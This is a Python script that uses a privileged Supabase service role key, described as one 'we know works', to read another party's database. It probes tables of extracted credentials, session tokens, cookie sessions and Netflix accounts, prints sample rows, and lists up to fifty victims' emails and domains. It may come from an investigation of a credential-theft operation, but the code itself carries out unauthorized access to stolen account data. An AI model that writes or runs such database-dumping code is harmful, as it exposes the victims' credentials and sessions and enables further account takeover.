"""
Query the AUDIT Supabase (which has a service role key we know works)
to see what tables exist and check for Netflix account data.
Also try the injector Supabase with the correct service role key.
"""
import requests
import json

# AUDIT Supabase - we have service role key


audit_headers = {
    'apikey': AUDIT_KEY,
    'Authorization': 'Bearer ' + AUDIT_KEY,
    'Content-Type': 'application/json',
}

print("=== AUDIT SUPABASE (" + AUDIT_URL + ") ===")
audit_tables = ['audit_captures', 'extracted_credentials', 'session_tokens', 'cookie_sessions', 'netflix_accounts', 'accounts']
for table in audit_tables:
    r = requests.get(AUDIT_URL + '/rest/v1/' + table + '?select=*&limit=3', headers=audit_headers, timeout=20)
    print('[' + table + '] -> HTTP ' + str(r.status_code))
    if r.status_code == 200:
        data = r.json()
        print('  Count: ' + str(len(data)))
        if data:
            print('  Cols: ' + str(list(data[0].keys())))
            for row in data[:2]:
                summary = {k: str(v)[:80] for k, v in row.items() if k not in ('cookies', 'cookie_data', 'raw_data', 'headers')}
                print('  ' + json.dumps(summary)[:200])
    else:
        print('  Error: ' + r.text[:100])
    print()

# Also try to get count from extracted_credentials
print("=== EXTRACTED CREDENTIALS COUNT ===")
r = requests.get(
    AUDIT_URL + '/rest/v1/extracted_credentials?select=id,email,domain,created_at',
    headers={**audit_headers, 'Prefer': 'count=exact', 'Range-Unit': 'items', 'Range': '0-49'},
    timeout=20
)
print('HTTP ' + str(r.status_code))
print('Content-Range: ' + r.headers.get('Content-Range', 'N/A'))
if r.status_code in (200, 206):
    data = r.json()
    print('Returned: ' + str(len(data)) + ' rows')
    if data:
        print('Columns: ' + str(list(data[0].keys())))
        print()
        print('Email'.ljust(50) + 'Domain'.ljust(30) + 'Date')
        print('-' * 90)
        for row in data[:50]:
            email = str(row.get('email') or 'N/A')[:48]
            domain = str(row.get('domain') or 'N/A')[:28]
            date = str(row.get('created_at') or '')[:10]
            print(email.ljust(50) + domain.ljust(30) + date)
